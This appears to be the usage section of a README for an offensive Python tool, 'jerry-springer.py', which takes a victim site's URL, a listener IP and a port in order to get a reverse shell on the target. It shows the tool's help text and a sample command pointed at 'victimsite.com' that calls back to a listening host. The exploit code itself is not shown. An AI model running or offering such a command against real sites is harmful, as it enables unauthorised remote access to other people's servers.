# Usage:

```
python3 jerry-springer.py -h                                     
usage: jerry-springer.py [-h] -u URL -l LHOST -p PORT

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     The URL of the site. e.g.: hxxps://www.victimsite.com/
  -l LHOST, --lhost LHOST
                        The IP address of the host listening for a shell. e.g.: 192.168.1.133
  -p PORT, --port PORT  The port you're listening on with the listening host. e.g.: 4443
  ```
  
  # Example: 
  
  ```
$ python3 jerry-springer.py -u hxxps://victimsite.com -l 127.0.0.1 -p 4443
```
